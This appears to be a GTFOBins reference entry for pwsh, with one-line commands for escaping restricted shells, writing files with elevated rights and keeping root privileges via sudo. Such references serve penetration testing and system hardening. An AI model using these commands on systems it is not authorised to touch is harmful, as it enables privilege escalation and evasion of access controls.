# GTFOBin: pwsh

## Shell

It can be used to break out from restricted environments by spawning an interactive system shell.

```
pwsh
```

## File write

It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.

```
export LFILE=file_to_write
pwsh -c '"DATA" | Out-File $env:LFILE'
```

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

```
sudo pwsh
```